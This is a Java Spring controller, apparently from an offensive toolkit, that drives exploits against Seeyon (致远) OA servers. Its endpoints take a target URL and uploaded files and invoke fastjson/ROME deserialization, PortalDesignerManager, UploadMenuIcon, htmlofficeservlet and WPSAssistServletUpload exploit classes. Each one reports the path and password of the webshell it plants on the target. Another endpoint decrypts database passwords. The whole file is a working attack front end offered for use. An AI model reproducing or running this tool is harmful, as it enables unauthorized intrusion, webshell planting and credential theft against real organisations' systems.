package com.droplab.Controller.Seeyon;

import com.droplab.Controller.BaseController;
import com.droplab.Controller.Seeyon.Service.*;
import com.droplab.Utils.CommonUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

/**
 * 致远OA利用
 */
@Controller
@RequestMapping("/seeyon")
public class SeeyonController implements BaseController {
    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "Seeyon/index.html";
    }

    /**
     * 致远V6A5.6  fastjson二次反序列化不出网利用。fastjson+ROME二次反序列化
     * @param model
     * @return
     */
    @RequestMapping(value = "/A6V5FastJson",method = RequestMethod.POST)
    public String A6V5FastJson(Model model,
                               @RequestParam(value = "url",required=true)String url,
                               @RequestParam(value = "uType",required=true)String uType,
                               @RequestParam(value = "mOption",required=true)String mOption,
                               @RequestParam(value = "cmd" ,required=false,defaultValue = "")String cmd,
                               @RequestParam(value = "files", required = false) List<MultipartFile> files,
                               @RequestParam(value = "mType", required = false,defaultValue = "") String mType,
                               @RequestParam(value = "mMiddle", required = false,defaultValue = "") String mMiddle,
                               @RequestParam(value = "path", required = false,defaultValue = "") String path,
                               @RequestParam(value = "mshellType", required = false,defaultValue = "") String mshellType,
                               @RequestParam(value = "password", required = false,defaultValue = "") String password){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            if (!url.contains("/seeyon")) {
                url = url + "/seeyon";
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("uType",uType);
            hashMap.put("mOption",mOption);
            if(!cmd.equals("")){
                hashMap.put("cmd",cmd);
            }if(!mType.equals("")){
                hashMap.put("mType",mType);
            }if(!mMiddle.equals("")){
                hashMap.put("mMiddle",mMiddle);
            }if(!path.equals("")){
                hashMap.put("path",path);
            }if(!mshellType.equals("")){
                hashMap.put("mshellType",mshellType);
            }if(!password.equals("")){
                hashMap.put("password",password);
            }
            String filename=CommonUtils.RandomStr(8);
            hashMap.put("filename",filename);
            if (files != null && !files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            A6V5FastJson a6V5FastJson =(A6V5FastJson) Class.forName(getMap().get("A6V5FastJson")).newInstance();
            a6V5FastJson.setParams(hashMap);
            Connection.Response exploit = a6V5FastJson.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("A6V5FastJsonurl", url);
                modelMap.put("A6V5FastJson",s);
                modelMap.put("A6V5FastJsontips", String.format("如果写入成功，webshell路径：/%s.jsp,密码：%s", filename,password));
                CommonUtils.modelSet(modelMap, model);
                return "Seeyon/index.html";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("A6V5FastJsonurl", url);
        modelMap.put("A6V5FastJson", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Seeyon/index.html";
    }


    @RequestMapping(value = "/A6FileUploadPoc",method = RequestMethod.POST)
    public String A6FileUploadPoc(Model model,
                               @RequestParam(value = "url",required=true)String url,
                               @RequestParam(value = "version",required=true)String version,  //致远版本
                               @RequestParam(value = "pType",required=true)String pType,  //调用不同的利用链
                               @RequestParam(value = "files", required = false) List<MultipartFile> files){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            if (!url.contains("/seeyon")) {
                url = url + "/seeyon";
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("version",version);
            hashMap.put("pType",pType);
            String filename=CommonUtils.RandomStr(8);
            hashMap.put("filename",filename);
            if (files != null && !files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".jsp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            A6FileUploadPoc a6FileUploadPoc =(A6FileUploadPoc) Class.forName(getMap().get("A6FileUploadPoc")).newInstance();
            a6FileUploadPoc.setParams(hashMap);
            Connection.Response exploit = a6FileUploadPoc.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("A6FileUploadPocurl", url);
                modelMap.put("A6FileUploadPoc",s);
                if(pType.equals("PortalDesignerManager")){
                    modelMap.put("A6FileUploadPoctips", String.format("如果写入成功，webshell路径：%s/common/designer/pageLayout/%s.jsp", url,filename));
                }else if(pType.equals("UploadMenuIcon")){
                    modelMap.put("A6FileUploadPoctips", String.format("如果写入成功，webshell路径：%s/main/menuIcon/%s.jsp",url, filename));
                }
                CommonUtils.modelSet(modelMap, model);
                return "Seeyon/index.html";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("A6FileUploadPocurl", url);
        modelMap.put("A6FileUploadPoc", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Seeyon/index.html";
    }



    @RequestMapping(value = "/htmlofficeservlet",method = RequestMethod.POST)
    public String htmlofficeservlet(Model model,
                                  @RequestParam(value = "url",required=true)String url,
                                  @RequestParam(value = "count",required=true)String count,  //脏数据
                                  @RequestParam(value = "files", required = false) List<MultipartFile> files){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            if (!url.contains("/seeyon")) {
                url = url + "/seeyon";
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("count",count);
            String filename=CommonUtils.RandomStr(8);
            hashMap.put("filename","login"+filename);
            if (files != null && !files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            htmlofficeservlet HtmlOffice =(htmlofficeservlet) Class.forName(getMap().get("htmlofficeservlet")).newInstance();
            HtmlOffice.setParams(hashMap);
            Connection.Response exploit = HtmlOffice.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("htmlofficeservleturl", url);
                modelMap.put("htmlofficeservlet",s);
                modelMap.put("htmlofficeservlettips", String.format("如果写入成功，webshell路径：%s/login%s.jsp",url, filename));
                CommonUtils.modelSet(modelMap, model);
                return "Seeyon/index.html";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("htmlofficeservleturl", url);
        modelMap.put("htmlofficeservlet", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Seeyon/index.html";
    }



    @RequestMapping(value = "/WPSAssistServletUpload",method = RequestMethod.POST)
    public String WPSAssistServletUpload(Model model,
                                    @RequestParam(value = "url",required=true)String url,
                                    @RequestParam(value = "files", required = false) List<MultipartFile> files){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            if (!url.contains("/seeyon")) {
                url = url + "/seeyon";
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            String filename=CommonUtils.RandomStr(8);
            hashMap.put("filename","login"+filename);
            if (files != null && !files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            WPSAssistServletUpload wpsAssistServletUpload =(WPSAssistServletUpload) Class.forName(getMap().get("WPSAssistServletUpload")).newInstance();
            wpsAssistServletUpload.setParams(hashMap);
            Connection.Response exploit = wpsAssistServletUpload.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("WPSAssistServletUploadurl", url);
                modelMap.put("WPSAssistServletUpload",s);
                modelMap.put("WPSAssistServletUploadtips", String.format("如果写入成功，webshell路径：%s/login%s.jsp",url, filename));
                CommonUtils.modelSet(modelMap, model);
                return "Seeyon/index.html";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("WPSAssistServletUploadurl", url);
        modelMap.put("WPSAssistServletUpload", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Seeyon/index.html";
    }



    /**
     * 数据库密码解密
     * @param model
     * @param password
     * @return
     */
    @RequestMapping(value = "/DBPassDecode",method = RequestMethod.POST)
    public String DBPassDecode(Model model,
                                    @RequestParam(value = "password",required=true)String password){
        try {
            HashMap hashMap = new HashMap();
            hashMap.put("password",password);
            DBPassDecode dbPassDecode =(DBPassDecode) Class.forName(getMap().get("DBPassDecode")).newInstance();
            dbPassDecode.setParams(hashMap);
            Connection.Response exploit = dbPassDecode.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("DBPassDecodepassword",password);
                modelMap.put("DBPassDecode",s);
                CommonUtils.modelSet(modelMap, model);
                return "Seeyon/index.html";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("DBPassDecodepassword", password);
        modelMap.put("DBPassDecode", "解密出错");
        CommonUtils.modelSet(modelMap, model);
        return "Seeyon/index.html";
    }

    @Override
    public Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("A6V5FastJson", "com.droplab.Controller.Seeyon.Service.A6V5FastJson");
        hashMap.put("A6FileUploadPoc", "com.droplab.Controller.Seeyon.Service.A6FileUploadPoc");
        hashMap.put("htmlofficeservlet", "com.droplab.Controller.Seeyon.Service.htmlofficeservlet");
        hashMap.put("DBPassDecode", "com.droplab.Controller.Seeyon.Service.DBPassDecode");
        hashMap.put("WPSAssistServletUpload", "com.droplab.Controller.Seeyon.Service.WPSAssistServletUpload");
        return hashMap;
    }
}

